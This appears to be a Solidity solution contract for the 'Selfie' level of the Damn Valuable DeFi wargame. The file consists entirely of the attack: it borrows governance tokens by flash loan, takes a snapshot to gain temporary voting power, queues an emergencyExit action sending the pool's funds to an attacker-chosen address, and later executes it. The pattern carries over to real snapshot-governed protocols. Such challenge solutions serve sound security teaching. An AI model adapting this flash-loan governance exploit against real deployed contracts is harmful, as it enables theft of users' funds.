// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/ISimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker {
    ISimpleGovernance private immutable governance;
    SelfiePool private immutable pool;

    constructor(address _governance, address _pool) {
        governance = ISimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function attack(address _target, uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            _target
        );
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(pool.token()),
            _amount,
            data
        );
    }

    function execute() external {
        governance.executeAction(1);
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        governance.queueAction(address(pool), 0, _data);

        token.approve(msg.sender, _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
